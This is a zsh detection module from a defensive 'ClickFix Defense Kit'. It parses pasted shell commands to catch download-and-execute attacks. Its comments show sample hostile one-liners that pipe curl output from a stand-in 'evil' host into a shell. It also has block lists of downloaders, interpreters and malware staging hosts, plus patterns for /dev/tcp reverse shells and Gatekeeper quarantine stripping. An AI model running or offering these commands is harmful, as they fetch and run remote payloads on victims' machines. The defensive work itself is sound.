# clickfix-grammar.zsh — ClickFix Defense Kit — SHARED DETECTION GRAMMAR
# =============================================================================
# The single source of truth for "is this command a download-and-execute
# attack?". ShellGuard (execute-time) and ClipSentinel (copy-time) both source
# this file, so the two layers can never disagree again.
#
# WHY THIS FILE EXISTS
# --------------------
# v0.1.0 matched a set of regexes against the raw command string. A red-team
# pass against that grammar passed 9 of 13 realistic ClickFix payloads,
# because a regex over an unparsed string cannot survive ordinary shell syntax:
#
#   curl "https://evil/x?a=1&b=2" | sh    the '&' broke a [^|;&]* run
#   curl https://evil/x | bash;           a trailing ';' broke ([[:space:]]|$)
#   curl https://evil/x | /bin/sh         a path prefix broke a bare literal
#   bash -c "$(curl -fsSL https://evil/x)"  no pipe-to-interpreter shape at all
#   curl -o /tmp/p https://evil/x; sh /tmp/p   download and exec in 2 statements
#
# So this is not a regex list. It is a small tokenizer that respects quoting,
# splits the buffer into statements and pipeline stages, normalizes each
# stage's command word (stripping sudo/env/command prefixes, quotes,
# backslashes and leading paths), classifies it, and then applies rules to the
# resulting STRUCTURE. Evading it requires changing what the command does, not
# how it is spelled.
#
# TWO TIERS
# ---------
# 'block' demands a typed confirmation phrase. 'warn' shows the banner and
# takes a single Enter. The tier split exists because over-prompting is the #1
# reason a guard gets uninstalled, and an uninstalled guard catches nothing.
# Heuristics with real false-positive rates (two-step download, homoglyphs,
# hdiutil) live at 'warn'. Unambiguous attack shapes live at 'block'.
#
# DEFENSIVE USE ONLY. Reads the command line; no network, no logging of values.
# =============================================================================

[[ -n ${_CLICKFIX_GRAMMAR_LOADED:-} ]] && return 0
typeset -g _CLICKFIX_GRAMMAR_LOADED=1

# -----------------------------------------------------------------------------
# Command classification tables
# -----------------------------------------------------------------------------

# Anything that pulls bytes off the network.
typeset -ga CLICKFIX_DOWNLOADERS
CLICKFIX_DOWNLOADERS=(
  curl wget fetch nscurl aria2c httpie http https
  ftp tftp scp sftp rsync nc ncat netcat socat
)

# Anything that will execute what it is handed.
typeset -ga CLICKFIX_INTERPRETERS
CLICKFIX_INTERPRETERS=(
  sh bash zsh dash ksh csh tcsh fish ash
  osascript python perl ruby node deno bun php
  tclsh lua Rscript pwsh powershell swift expect awk
)

# Anything that unwraps an obfuscated payload. base64 is only the best known.
typeset -ga CLICKFIX_DECODERS
CLICKFIX_DECODERS=(
  base64 xxd uudecode uncompress gunzip gzip zcat bunzip2 bzcat
  unxz xzcat zstd openssl tr rev od plutil
)

# Words that can sit in front of the real command word without changing it.
typeset -ga CLICKFIX_PREFIXES
CLICKFIX_PREFIXES=(
  sudo doas su command exec env nice nohup time stdbuf setsid
  caffeinate arch builtin xargs script
)

# -----------------------------------------------------------------------------
# Trust data
# -----------------------------------------------------------------------------
# CLICKFIX_ALLOW_HOSTS holds SINGLE-TENANT installer endpoints only: hosts where
# the domain owner controls every byte served. A host where any member of the
# public can publish arbitrary content can NEVER be a trust anchor by hostname.
#
# v0.1.0 shipped raw.githubusercontent.com and raw.github.com here, which meant
# any attacker with a free GitHub account could stage a payload on a silently
# trusted host. Those are gone. GitHub raw is now trusted only via
# CLICKFIX_ALLOW_URL_PREFIXES, which matches host AND path prefix, so trust is
# scoped to specific upstream orgs.
typeset -ga CLICKFIX_ALLOW_HOSTS
: ${CLICKFIX_ALLOW_HOSTS:=}
if (( ${#CLICKFIX_ALLOW_HOSTS} == 0 )); then
  CLICKFIX_ALLOW_HOSTS=(
    sh.rustup.rs
    static.rust-lang.org
    get.docker.com
    install.python-poetry.org
    get.pnpm.io
    get.sdkman.io
    get.volta.sh
    deb.nodesource.com
    brew.sh
    bun.sh
    astral.sh
    deno.land
  )
fi

# Trust scoped to scheme+host+path-prefix. This is how a multi-tenant host can
# be trusted at all: only these upstream projects, not the whole domain.
typeset -ga CLICKFIX_ALLOW_URL_PREFIXES
: ${CLICKFIX_ALLOW_URL_PREFIXES:=}
if (( ${#CLICKFIX_ALLOW_URL_PREFIXES} == 0 )); then
  CLICKFIX_ALLOW_URL_PREFIXES=(
    raw.githubusercontent.com/ohmyzsh/
    raw.githubusercontent.com/Homebrew/
    raw.githubusercontent.com/nvm-sh/
    raw.githubusercontent.com/rbenv/
    raw.githubusercontent.com/pyenv/
    raw.githubusercontent.com/asdf-vm/
  )
fi

# Hosts that can never be allowlisted and that ESCALATE the warning text.
# These are the staging hosts current infostealer campaigns actually use.
typeset -ga CLICKFIX_HIGH_RISK_HOSTS
CLICKFIX_HIGH_RISK_HOSTS=(
  gist.githubusercontent.com objects.githubusercontent.com
  cdn.discordapp.com media.discordapp.net
  pastebin.com paste.ee hastebin.com termbin.com
  ipfs.io dweb.link cloudflare-ipfs.com
  t.me telegra.ph
  transfer.sh 0x0.st bashupload.com file.io anonfiles.com temp.sh
  ngrok.io ngrok-free.app trycloudflare.com
)

# Python -m modules that are data formatters, not code loaders. A pipe into one
# of these downgrades to 'warn' instead of 'block' so `curl api | python3 -m
# json.tool` does not train the user to ignore the guard.
typeset -ga CLICKFIX_SAFE_MODULES
CLICKFIX_SAFE_MODULES=( json.tool base64 csv this calendar tabnanny )

# -----------------------------------------------------------------------------
# Results (set by clickfix_check)
# -----------------------------------------------------------------------------
typeset -g  CLICKFIX_VERDICT=silent      # block | warn | silent
typeset -ga CLICKFIX_REASONS             # human-readable explanation lines
typeset -ga CLICKFIX_HOSTS               # every host seen in the buffer
typeset -g  CLICKFIX_HIGH_RISK=0         # 1 if a known staging host appeared

# Internal scanner output
typeset -ga _cfg_stages                  # stage strings; $'\x1e' marks a statement break
typeset -g  _cfg_clean=''                # buffer with comments stripped
typeset -g  _cfg_unquoted=''             # buffer with quoted spans blanked out

# =============================================================================
# SCANNER
# =============================================================================
# One pass over the buffer, tracking quote state, producing:
#   _cfg_stages    pipeline stages, with $'\x1e' elements marking statement breaks
#   _cfg_clean     the buffer minus unquoted # comments (a trailing decoy comment
#                  is standard ClickFix tradecraft AND was a v0.1.0 evasion)
#   _cfg_unquoted  the buffer with quoted spans replaced by spaces, so a rule can
#                  ask "did this token appear OUTSIDE a string?" — which is what
#                  stops `git commit -m "note about /dev/tcp/x/9000"` from firing
_cfg_scan() {
  emulate -L zsh
  setopt local_options no_glob no_nomatch no_unset

  local s=$1
  local -i i=1 n=${#s}
  local c q='' cur='' prev=' '
  local -a stages
  local RS=$'\x1e'

  _cfg_stages=()
  _cfg_clean=''
  _cfg_unquoted=''
  stages=()

  while (( i <= n )); do
    c=${s[i]}

    # Inside a quoted span: consume verbatim until the matching quote.
    if [[ -n $q ]]; then
      cur+=$c; _cfg_clean+=$c; _cfg_unquoted+=' '
      [[ $c == $q ]] && q=''
      prev=$c; (( i++ )); continue
    fi

    case $c in
      '\')
        # Backslash escapes the next char. Keep both in the stage text so
        # normalization can strip them, but never let the escaped char act
        # as a separator. This is what makes `| \sh` resolve to `sh`.
        cur+=$c; _cfg_clean+=$c; _cfg_unquoted+=' '
        (( i++ ))
        if (( i <= n )); then
          cur+=${s[i]}; _cfg_clean+=${s[i]}; _cfg_unquoted+=' '
          (( i++ ))
        fi
        prev='\'
        continue
        ;;

      "'"|'"')
        q=$c
        cur+=$c; _cfg_clean+=$c; _cfg_unquoted+=' '
        prev=$c; (( i++ )); continue
        ;;

      '#')
        # A comment only starts at a word boundary, so a URL fragment
        # (https://x/#frag) is not treated as one.
        if [[ $prev == ' ' || $prev == $'\t' || $prev == $'\n' ]]; then
          while (( i <= n )) && [[ ${s[i]} != $'\n' ]]; do (( i++ )); done
          continue
        fi
        cur+=$c; _cfg_clean+=$c; _cfg_unquoted+=$c
        prev=$c; (( i++ )); continue
        ;;

      ';'|$'\n')
        stages+=("$cur"); cur=''
        _cfg_stages+=("${stages[@]}") ; _cfg_stages+=("$RS")
        stages=()
        _cfg_clean+=' ; '; _cfg_unquoted+=' '
        prev=' '; (( i++ )); continue
        ;;

      '&')
        # '&&' and a bare backgrounding '&' both end the statement.
        stages+=("$cur"); cur=''
        _cfg_stages+=("${stages[@]}"); _cfg_stages+=("$RS")
        stages=()
        [[ ${s[i+1]:-} == '&' ]] && (( i++ ))
        _cfg_clean+=' ; '; _cfg_unquoted+=' '
        prev=' '; (( i++ )); continue
        ;;

      '|')
        if [[ ${s[i+1]:-} == '|' ]]; then
          # '||' is a statement break, not a pipe.
          stages+=("$cur"); cur=''
          _cfg_stages+=("${stages[@]}"); _cfg_stages+=("$RS")
          stages=()
          _cfg_clean+=' ; '; _cfg_unquoted+=' '
          prev=' '; (( i += 2 )); continue
        fi
        stages+=("$cur"); cur=''
        _cfg_clean+=' | '; _cfg_unquoted+=' '
        prev=' '; (( i++ )); continue
        ;;

      *)
        cur+=$c; _cfg_clean+=$c; _cfg_unquoted+=$c
        prev=$c; (( i++ )); continue
        ;;
    esac
  done

  stages+=("$cur")
  _cfg_stages+=("${stages[@]}"); _cfg_stages+=("$RS")
}

# =============================================================================
# NORMALIZATION
# =============================================================================

# _cfg_cmdword <stage>
# Reduce a pipeline stage to its effective command word: strip leading
# environment assignments, strip prefix commands (with their flags), strip
# quotes and backslashes, strip any leading path. `| sudo -u nobody /bin/\sh -x`
# normalizes to `sh`.
_cfg_cmdword() {
  emulate -L zsh
  # extended_glob is REQUIRED: the `[0-9.]#` and `[A-Za-z0-9_]#` patterns below
  # are extended-glob syntax, and `emulate -L zsh` turns it off by default.
  setopt local_options no_nomatch extended_glob

  local stage=$1
  local -a toks
  toks=( ${(z)stage} ) 2>/dev/null || toks=( ${=stage} )
  (( ${#toks} == 0 )) && { print -r -- ''; return }

  local -i idx=1
  local w bare
  while (( idx <= ${#toks} )); do
    w=${toks[idx]}
    # Strip quotes and backslashes so `'sh'` and `\sh` both resolve to `sh`.
    bare=${w//[\'\"\\]/}
    [[ -z $bare ]] && { (( idx++ )); continue }

    # Leading VAR=value assignments are not the command.
    if [[ $bare == [A-Za-z_][A-Za-z0-9_]#=* ]]; then
      (( idx++ )); continue
    fi

    local base=${bare:t}   # basename: /bin/sh -> sh

    # A prefix command: skip it and any of its flags (and -u/-g arguments).
    if (( ${CLICKFIX_PREFIXES[(Ie)$base]} )); then
      (( idx++ ))
      while (( idx <= ${#toks} )); do
        local nx=${toks[idx]//[\'\"\\]/}
        if [[ $nx == -* ]]; then
          # `sudo -u user` consumes an argument.
          if [[ $nx == (-u|-g|-U|--user|--group) ]]; then (( idx++ )); fi
          (( idx++ ))
        else
          break
        fi
      done
      continue
    fi

    print -r -- "$base"
    return
  done
  print -r -- ''
}

# _cfg_family <cmdword>
# Collapse versioned interpreter names: python3.11 -> python, php8 -> php.
_cfg_family() {
  emulate -L zsh
  setopt local_options extended_glob
  local w=$1
  case $w in
    python[0-9.]#)  print -r -- python ;;
    perl[0-9.]#)    print -r -- perl ;;
    ruby[0-9.]#)    print -r -- ruby ;;
    node[0-9.]#)    print -r -- node ;;
    php[0-9.]#)     print -r -- php ;;
    *)              print -r -- "$w" ;;
  esac
}

_cfg_is_downloader() { (( ${CLICKFIX_DOWNLOADERS[(Ie)$(_cfg_family $1)]} )) }
_cfg_is_interpreter() { (( ${CLICKFIX_INTERPRETERS[(Ie)$(_cfg_family $1)]} )) }
_cfg_is_decoder()    { (( ${CLICKFIX_DECODERS[(Ie)$(_cfg_family $1)]} )) }

# =============================================================================
# URL / TRUST
# =============================================================================

# _cfg_urls <buffer> — every http(s) URL, one per line.
_cfg_urls() {
  emulate -L zsh
  setopt local_options no_glob
  print -r -- "$1" | grep -oE 'https?://[^[:space:]"'\''`)<>]+' 2>/dev/null
}

# _cfg_host <url> — bare lowercase hostname, userinfo/port/path stripped.
# The userinfo strip matters: https://sh.rustup.rs@evil.tld/x must resolve to
# evil.tld, which is where the request actually goes.
_cfg_host() {
  emulate -L zsh
  local u=${1#http://}; u=${u#https://}
  u=${u##*@}          # strip userinfo
  u=${u%%/*}          # strip path
  u=${u%%\?*}
  u=${u%%:*}          # strip port
  print -r -- "${(L)u}"
}

# _cfg_url_trusted <url>
# Exact host match against single-tenant installers, or host+path-prefix match.
# There is deliberately NO wildcard-subdomain rule: *.host trust was how
# v0.1.0 blanket-trusted a multi-tenant domain.
_cfg_url_trusted() {
  emulate -L zsh
  local url=$1
  local host=$(_cfg_host "$url")
  local hostpath=${url#http://}; hostpath=${hostpath#https://}
  hostpath=${hostpath##*@}
  hostpath=${(L)hostpath}

  local a
  for a in $CLICKFIX_ALLOW_HOSTS; do
    [[ $host == ${(L)a} ]] && return 0
  done
  for a in $CLICKFIX_ALLOW_URL_PREFIXES; do
    [[ $hostpath == ${(L)a}* ]] && return 0
  done
  return 1
}

# _cfg_all_urls_trusted <buffer>
# True only if there is at least one URL and every one of them is trusted.
_cfg_all_urls_trusted() {
  emulate -L zsh
  local -a urls
  urls=( ${(f)"$(_cfg_urls "$1")"} )
  (( ${#urls} == 0 )) && return 1
  local u
  for u in $urls; do
    [[ -z $u ]] && continue
    _cfg_url_trusted "$u" || return 1
  done
  return 0
}

# =============================================================================
# DISPLAY SAFETY
# =============================================================================
# The buffer is attacker-controlled. Printing it raw lets a payload emit ANSI
# to scroll the warning off screen or paint a fake confirmation line into the
# kit's own banner. Strip C0/C1 controls and zero-width/bidi codepoints, and
# cap the height.
clickfix_sanitize_for_display() {
  emulate -L zsh
  setopt local_options no_glob
  local s=$1
  local -i maxlines=${2:-12}
  s=${s//[$'\x00'-$'\x08'$'\x0b'-$'\x1f'$'\x7f']/'?'}
  s=${s//$'\u200b'/'<ZWSP>'}
  s=${s//$'\u200c'/'<ZWNJ>'}
  s=${s//$'\u200d'/'<ZWJ>'}
  s=${s//$'\ufeff'/'<BOM>'}
  s=${s//$'\u202f'/'<NNBSP>'}
  local -a lines
  lines=( ${(f)s} )
  if (( ${#lines} > maxlines )); then
    local -i extra=$(( ${#lines} - maxlines ))
    s="${(F)lines[1,$maxlines]}"$'\n'"    ... (truncated, $extra more line(s))"
  fi
  print -r -- "$s"
}

# =============================================================================
# RULES
# =============================================================================
# Verdicts escalate: silent -> warn -> block. Reasons carry a waivability flag,
# because the trusted-host allowlist must only ever waive the plain
# "download and run an installer" shape. It must NEVER waive osascript,
# /dev/tcp, quarantine stripping, or an obfuscated decoder — v0.1.0 applied the
# allowlist uniformly after all patterns, which silently waived its own
# always-hostile osascript rule.

typeset -g _cfg_waivable_only=1

_cfg_raise() {
  # _cfg_raise <tier> <waivable 0|1> <reason text>
  local tier=$1 waivable=$2 text=$3
  (( waivable )) || _cfg_waivable_only=0
  CLICKFIX_REASONS+=( "$text" )
  if [[ $tier == block ]]; then
    CLICKFIX_VERDICT=block
  elif [[ $tier == warn && $CLICKFIX_VERDICT != block ]]; then
    CLICKFIX_VERDICT=warn
  fi
}

# clickfix_check <buffer>
# Sets CLICKFIX_VERDICT, CLICKFIX_REASONS, CLICKFIX_HOSTS, CLICKFIX_HIGH_RISK.
clickfix_check() {
  emulate -L zsh
  setopt local_options no_nomatch extended_glob

  local buf=$1
  CLICKFIX_VERDICT=silent
  CLICKFIX_REASONS=()
  CLICKFIX_HOSTS=()
  CLICKFIX_HIGH_RISK=0
  _cfg_waivable_only=1

  [[ -z ${buf//[[:space:]]/} ]] && return 0

  _cfg_scan "$buf"
  local clean=$_cfg_clean
  local unq=$_cfg_unquoted
  local RS=$'\x1e'

  # ---- host inventory --------------------------------------------------
  local -a urls
  urls=( ${(f)"$(_cfg_urls "$clean")"} )
  local u h risky
  for u in $urls; do
    [[ -z $u ]] && continue
    h=$(_cfg_host "$u")
    [[ -n $h ]] && CLICKFIX_HOSTS+=( "$h" )
    for risky in $CLICKFIX_HIGH_RISK_HOSTS; do
      if [[ $h == ${(L)risky} || $h == *.${(L)risky} ]]; then
        CLICKFIX_HIGH_RISK=1
      fi
    done
  done

  # ---- walk statements, classifying each pipeline stage ----------------
  local -a stmt
  local stage cw
  local -i saw_dl saw_dec si
  local -a stmt_words

  stmt=()
  local elem
  for elem in "${_cfg_stages[@]}"; do
    if [[ $elem != $RS ]]; then
      stmt+=( "$elem" )
      continue
    fi

    # --- end of a statement: apply per-statement rules ---
    if (( ${#stmt} > 0 )); then
      saw_dl=0; saw_dec=0
      for (( si = 1; si <= ${#stmt}; si++ )); do
        stage=${stmt[si]}
        [[ -z ${stage//[[:space:]]/} ]] && continue
        cw=$(_cfg_cmdword "$stage")
        [[ -z $cw ]] && continue

        # RULE A — a downloader or decoder earlier in the pipeline, an
        # interpreter later. Covers curl|sh, curl|tee|sh, curl|gunzip|bash,
        # base64 -d|sh, and every interposed-stage variant in one rule.
        if _cfg_is_interpreter "$cw" && (( saw_dl || saw_dec )); then
          local tier=block
          # `curl api | python3 -m json.tool` is a data formatter, not a
          # code loader. Downgrade rather than train the user to ignore us.
          if [[ $stage == *-m[[:space:]]* ]]; then
            local m
            for m in $CLICKFIX_SAFE_MODULES; do
              [[ $stage == *"-m "*"$m"* ]] && tier=warn
            done
          fi
          if (( saw_dl )); then
            _cfg_raise $tier 1 "Downloads code from the internet and pipes it straight into ${cw} — it runs without you ever reading it."
          else
            _cfg_raise $tier 0 "Decodes hidden/obfuscated text and pipes it straight into ${cw} — a classic way to hide the real payload."
          fi
        fi

        # RULE B — interpreter -c/-e whose inline program itself downloads.
        # This is the `bash -c "$(curl ...)"` shape, which has no pipe at all.
        if _cfg_is_interpreter "$cw" && [[ $stage == *(-c|-e|--eval|--exec)[[:space:]]* ]]; then
          if [[ $stage == *'$('* || $stage == *'`'* ]]; then
            local d found=0
            for d in $CLICKFIX_DOWNLOADERS; do
              [[ $stage == *"$d"* ]] && found=1
            done
            (( found )) && _cfg_raise block 1 "Runs an inline ${cw} program that downloads and executes remote code."
          fi
          # RULE H — inline program with BOTH a network primitive and an exec
          # primitive. v0.1.0 fired on either one alone, so
          # `python3 -c "import os; os.system(1)"` was flagged with no network
          # involved at all. Requiring both kills that false positive.
          local netp=0 execp=0 p
          for p in urllib urlopen 'requests.get' http socket 'open-uri' 'Net::HTTP' 'child_process' fetch; do
            [[ $stage == *"$p"* ]] && netp=1
          done
          for p in 'exec(' 'eval(' 'os.system' 'system(' subprocess popen spawn '`'; do
            [[ $stage == *"$p"* ]] && execp=1
          done
          (( netp && execp )) && _cfg_raise block 1 "Inline ${cw} program both fetches from the network and executes what it fetched."
        fi

        # RULE E — AppleScript shelling out to a downloader. AMOS uses
        # osascript for the fake password dialog, and the applescript:// deep
        # link opens Script Editor pre-filled with exactly this shape.
        if [[ $cw == osascript ]]; then
          if [[ $stage == *'do shell script'* ]]; then
            local d
            for d in $CLICKFIX_DOWNLOADERS; do
              if [[ $stage == *"$d"* ]]; then
                _cfg_raise block 0 "AppleScript that shells out to ${d} — infostealers use osascript to run payloads and to pop a FAKE password prompt."
                break
              fi
            done
          fi
        fi

        # A shell's quoted -c argument is code, not prose: a /dev/tcp inside
        # it is a reverse shell, whereas the same bytes quoted as an argument
        # to git or echo are just text. This is why the whole-buffer rule F2
        # only looks at UNQUOTED text and this one looks inside the quotes.
        if _cfg_is_interpreter "$cw" && [[ $stage =~ '/dev/(tcp|udp)/[0-9a-zA-Z._-]+/[0-9]+' ]]; then
          _cfg_raise block 0 "Opens a raw network socket via /dev/tcp inside a ${cw} program — this is a reverse-shell shape."
        fi

        _cfg_is_downloader "$cw" && saw_dl=1
        _cfg_is_decoder "$cw"    && saw_dec=1

        # RULE C — a command substitution whose output becomes a command.
        # Two forms: a bare leading `$(curl x)`, and eval/source/. of one.
        # v0.1.0 only matched the eval form, and only with a literal prefix.
        if [[ $cw == (eval|source|.) ]] || { (( si == 1 )) && [[ ${stage##[[:space:]]#} == ('$('|'`')* ]] }; then
          local d
          for d in $CLICKFIX_DOWNLOADERS; do
            if [[ $stage == *"$d"* ]]; then
              _cfg_raise block 1 "Runs the output of a remote download as a command (\$( ... ) substitution)."
              break
            fi
          done
        fi
      done
    fi
    stmt=()
  done

  # ---- whole-buffer rules ---------------------------------------------

  # RULE F1 — stripping the quarantine attribute. This is the "right-click
  # Open / it says the app is damaged" instruction, and it is the user
  # manually disarming Gatekeeper. Never legitimate in a pasted command.
  if [[ $unq == *'xattr'* ]] && [[ $clean == *(-c|-cr|-rc|-d|--delete|--clear)* ]]; then
    if [[ $clean == *'com.apple.quarantine'* || $clean == *(-c|-cr|-rc)[[:space:]]* ]]; then
      _cfg_raise block 0 "Strips macOS quarantine flags (xattr) — this manually disables Gatekeeper on a downloaded file."
    fi
  fi

  # RULE F2 — /dev/tcp or /dev/udp reverse shell. Only when UNQUOTED, so
  # `git commit -m "note about /dev/tcp/host/9000"` does not fire.
  if [[ $unq =~ '/dev/(tcp|udp)/[0-9a-zA-Z._-]+/[0-9]+' ]]; then
    _cfg_raise block 0 "Opens a raw network socket via /dev/tcp — this is a reverse-shell shape."
  fi

  # RULE F3 — mounting a remote or temp disk image, the delivery step in
  # current macOS stealer campaigns. Legitimate often enough to be 'warn'.
  if [[ $clean == *'hdiutil'*'attach'* ]] && [[ $clean == *(http://|https://|/tmp/|/var/folders/)* ]]; then
    _cfg_raise warn 0 "Mounts a disk image fetched from the internet or staged in a temp directory."
  fi

  # RULE D — download-to-file in one statement, execute that file in another.
  # This is the single most common shape the v0.1.0 regex could not see.
  # It sits at 'warn' because ordinary development legitimately downloads a
  # file and then runs it; at 'block' this rule alone would fire hourly.
  local dlpath=''
  if [[ $clean =~ '(curl|wget|fetch|nscurl|aria2c)[^;|]*(-o|-O|--output|--output-document|>)[[:space:]]*([^[:space:];|&]+)' ]]; then
    dlpath=${match[3]:-}
    dlpath=${dlpath//[\'\"]/}
  fi
  if [[ -n $dlpath ]]; then
    local base=${dlpath:t}
    if [[ -n $base ]]; then
      # Executed directly, chmod'd, or handed to an interpreter later on.
      if [[ $clean == *'chmod'*"$base"* ]] \
         || [[ $clean == *'./'"$base"* ]] \
         || [[ $clean =~ "(sh|bash|zsh|dash|osascript|python[0-9.]*|perl|ruby|node|open|installer)[[:space:]][^;|]*${base}" ]]; then
        _cfg_raise warn 1 "Downloads a file and then runs it in a separate command — the two halves of a download-and-execute attack, split up."
      fi
    fi
  fi

  # RULE G — invisible or look-alike characters. Zero-width and bidi controls
  # have no legitimate place in a shell command, and Cyrillic homoglyphs in
  # decoy comments are standard ClickFix tradecraft.
  if [[ $buf == *$'\u200b'* || $buf == *$'\u200c'* || $buf == *$'\u200d'* \
     || $buf == *$'\ufeff'* || $buf == *$'\u202a'* || $buf == *$'\u202b'* \
     || $buf == *$'\u202c'* || $buf == *$'\u202d'* || $buf == *$'\u202e'* \
     || $buf == *$'\u2066'* || $buf == *$'\u2067'* || $buf == *$'\u2068'* \
     || $buf == *$'\u2069'* || $buf == *$'\u202f'* ]]; then
    _cfg_raise warn 0 "Contains invisible or direction-changing characters — used to hide what a command really says."
  fi
  # Cyrillic/Greek letters outside any quoted string. Written as a glob range
  # over literal codepoints because zsh's =~ has no \u escape.
  if [[ $unq == *[$'\u0400'-$'\u04ff'$'\u0370'-$'\u03ff']* ]]; then
    _cfg_raise warn 0 "Contains look-alike (Cyrillic/Greek) letters in the command itself — a way to disguise a hostile command as a familiar one."
  fi

  # ---- trusted-installer waiver ---------------------------------------
  # Only applies when EVERY reason raised was waivable and every URL in the
  # buffer resolves to a trusted single-tenant installer or an allowlisted
  # host+path prefix.
  if [[ $CLICKFIX_VERDICT != silent ]] && (( _cfg_waivable_only )) && (( ! CLICKFIX_HIGH_RISK )); then
    if _cfg_all_urls_trusted "$clean"; then
      CLICKFIX_VERDICT=silent
      CLICKFIX_REASONS=()
    fi
  fi

  if (( CLICKFIX_HIGH_RISK )) && [[ $CLICKFIX_VERDICT != silent ]]; then
    CLICKFIX_REASONS+=( "The download is staged on a host commonly used to serve malware payloads." )
  fi

  [[ $CLICKFIX_VERDICT == silent ]] && return 0
  return 1
}
